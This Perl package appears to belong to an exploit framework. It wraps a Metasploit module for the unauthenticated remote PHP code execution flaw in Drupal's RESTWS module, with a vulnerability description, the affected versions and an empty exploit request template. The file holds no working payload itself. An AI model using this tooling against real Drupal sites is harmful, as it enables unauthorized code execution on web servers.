package DRUPAL::MSF::DrupalRestwsExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "DrupalRestwsExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a Remote PHP Code Execution vulnerability in the

        Drupal RESTWS Module. Unauthenticated users can execute arbitrary code

        under the context of the web server user.



        RESTWS alters the default page callbacks for entities to provide

        additional functionality. A vulnerability in this approach allows

        an unauthenticated attacker to send specially crafted requests resulting

        in arbitrary PHP execution. RESTWS 2.x prior to 2.6 and 1.x prior to 1.7

        are affected by this issue.



        This module was tested against RESTWS 2.5 with Drupal 7.5 installed on

        Ubuntu Server.

      ",
  MSF_MODULE => "drupal_restws_exec",
  PATHS => [""],
  REFERENCES => ["https://www.drupal.org/node/2765567"],
  TITLE => "Drupal RESTWS Module Remote PHP Code Execution",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The target URI of the Drupal installation",
  VALUE => "/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
